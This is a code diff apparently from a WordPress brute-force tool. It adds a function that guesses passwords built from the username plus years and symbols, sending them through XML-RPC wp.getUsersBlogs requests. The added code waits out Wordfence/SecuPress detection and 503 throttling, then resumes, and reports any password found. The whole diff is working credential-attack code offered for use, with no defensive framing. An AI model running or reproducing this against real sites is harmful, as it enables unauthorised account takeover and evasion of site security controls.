@@ -166,11 +166,57 @@ def search_users(url, wordlist, user, time_sleep, u_agent, admin_page, try_metho
                 print("{}Nothing users found".format(LESS))
 
 
+def user_reuse(url, user, time_sleep, u_agent, admin_page):
+    dico_user_reuse = ["{}2016".format(user),"{}2017".format(user),"{}2018".format(user),"{}2019".format(user),"{}2020".format(user),"{}2021".format(user),
+    "{}@2016".format(user),"{}@2017".format(user),"{}@2018".format(user),"{}@2019".format(user),"{}@2020".format(user),"{}@2021".format(user),
+    "{}2016!".format(user),"{}2017!".format(user),"{}2018!".format(user),"{}2019!".format(user),"{}2020!".format(user),"{}2021!".format(user),
+    "{}123".format(user), "{}123!".format(user), "{}@123!".format(user)]
+    for dur in dico_user_reuse:
+        datas = '''<methodCall>
+                <methodName>wp.getUsersBlogs</methodName>
+                <params>
+                <param><value>{}</value></param>
+                <param><value>{}</value></param>
+                </params>
+                </methodCall>'''.format(user, dur)
+        try:
+            req = requests.post(url, data=datas, verify=False)
+        except KeyboardInterrupt as e:
+            print("[-] Killing processes...")
+            sys.exit(1)
+        except:
+            print("An error as occured")
+        if rs:
+            print(req.text)
+        time.sleep(float(time_sleep))
+        print(dur)
+        if "Incorrect" in req.text or "incorrect" in req.text:
+            pass
+        elif any(wa in req.text for wa in words_alert):
+            print("{} SecuPress / Wordfence actived, wait 5 min...\n".format(LESS))
+            timer(300)
+        elif "503 Service Temporarily Unavailable" in req.text or req.status_code == 503:
+            print("{} Service seem Temporarily Unavailable, wait 5 min...\n".format(LESS))
+            timer(300)
+        else:
+            if admin_page:
+                res = requests.get(url.replace('xmlrpc.php', admin_page), verify=False)
+                if any(wa in req.text for wa in words_alert):
+                    print("{} SecuPress / Wordfence actived, wait 5 min...\n".format(LESS))
+                    timer(300)
+                else:
+                    print("{}password found: {}".format(PLUS, dur))
+                    sys.exit()
+
+
+
 def bf_user(url, wordlist, user, time_sleep, u_agent, admin_page):
     """
     bf_user: bruteforce with basic usernames if nothing users found
     """
     print("{}Bruteforce with username: {}".format(INFO, user))
+    if user not in ["admin", "Admin"]:
+        user_reuse(url, user, time_sleep, u_agent, admin_page)
     with open(wordlist, "r+") as dico:
         dicos = dico.read().splitlines()
         for d in dicos:
